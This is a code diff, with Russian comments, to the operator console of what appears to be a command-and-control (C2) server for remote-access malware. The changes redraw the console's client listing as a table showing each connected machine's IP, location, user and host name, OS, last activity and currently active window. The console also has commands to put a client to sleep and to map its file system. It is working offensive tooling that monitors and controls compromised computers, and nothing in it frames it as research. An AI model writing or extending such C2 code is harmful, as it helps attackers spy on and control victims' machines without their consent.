@@ -1,6 +1,8 @@
 import asyncio
 from logs import Log as logger
 from prompt_toolkit import PromptSession
+# ⚡️ Добавляем необходимый импорт для надежного вывода в CLI
+from prompt_toolkit.shortcuts import print_formatted_text
 from prompt_toolkit.patch_stdout import patch_stdout
 # Предполагаем, что Services корректно импортирован
 from backend.Services import close_client, close_all_client, list_clients, send_command
@@ -31,11 +33,10 @@ def print_c2_ready_message():
 async def operator_interface(server):
     session = PromptSession()
 
-    # УДАЛЕН ЛИШНИЙ КОД С session.prompt_async("")
-
     while True:
         with patch_stdout():
             try:
+                # Асинхронный ввод команды от пользователя
                 selected_str = await session.prompt_async(" >> ")
             except asyncio.CancelledError:
                 break  # Выход из цикла при отмене задачи
@@ -53,24 +54,54 @@ async def operator_interface(server):
             logger.info("[*] Сервер завершил работу.")
 
             # 2. ОТМЕНЯЕМ ВСЕ ОСТАЛЬНЫЕ ЗАДАЧИ В ЦИКЛЕ
-            # Это заставит asyncio.gather в Server.py выйти и выполнить cleanup.
             main_loop = asyncio.get_event_loop()
             for task in asyncio.all_tasks(main_loop):
                 if task is not asyncio.current_task():
                     task.cancel()
 
-            return  # Выход из функции, чтобы позволить task.cancel() сработать
+            return
 
-        # ... (остальной код)
         elif selected_str == "list":
             clients = list_clients()
+            output = ""  # Буфер для многострочного вывода
+
             if not clients:
                 logger.info("[!] Нет подключённых клиентов.")
             else:
-                logger.info("\n[Подключённые клиенты]")
+                # --- 1. ЗАГОЛОВОК СПИСКА ---
+                output += "\n[Подключённые клиенты]\n"
+
+                # --- 2. ШАПКА ТАБЛИЦЫ ---
+                header = (
+                    f"{'ID':<15} | {'IP':<15} | {'LAST ACTIVE':<20} | "
+                    f"{'LOC':<10} | {'USER@PC':<25} | {'OS/ARCH':<15} | ACTIVE WINDOW"
+                )
+                output += header + "\n"
+
+                # --- 3. ВЫВОД КЛИЕНТОВ ---
                 for info in clients:
-                    logger.info(f"[ID {info['id']}] {info['os']} | {info['user']}@{info['hostname']} | {info['arch']}")
-                logger.info("============================================================")
+                    user_pc = f"{info.get('user', 'N/A')}@{info.get('pc_name', 'N/A')}"
+                    os_arch = f"{info.get('os', 'N/A')}/{info.get('arch', 'N/A')}"
+
+                    # Используем ИСПРАВЛЕННЫЙ ключ 'last_active'
+                    output_line = (
+                        f"{info['id']:<15} | "
+                        f"{info['ip']:<15} | "
+                        f"{info.get('last_active', 'N/A'):<20} | "
+                        f"{info['loc']:<10} | "
+                        f"{user_pc:<25.25} | "
+                        f"{os_arch:<15} | "
+                        f"{info['activeWindow']}"
+                    )
+                    output += output_line + "\n"
+
+            # ⚡️ КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ: Вывод через print_formatted_text
+            # Это самый надежный способ вывода многострочного текста в prompt_toolkit
+            if output:
+                # Используем обычный print/print_formatted_text, чтобы избежать ошибки Vt100
+                # patch_stdout() гарантирует, что вывод не сломает строку ввода.
+                print_formatted_text(output)
+
 
         elif selected_str.startswith("sleep "):
             cid = selected_str[6:].strip()
@@ -89,7 +120,8 @@ async def operator_interface(server):
             logger.info(f"[*] Вход в режим клиента {cid}. Поддерживаемые команды: fsmap, sleep, back")
 
             while True:
-                if cid not in [c["id"] for c in list_clients()]:
+                current_clients = [c["id"] for c in list_clients()]
+                if cid not in current_clients:
                     logger.info(f"[!] Клиент {cid} отключился. Возвращаемся в глобальный режим.")
                     break
 
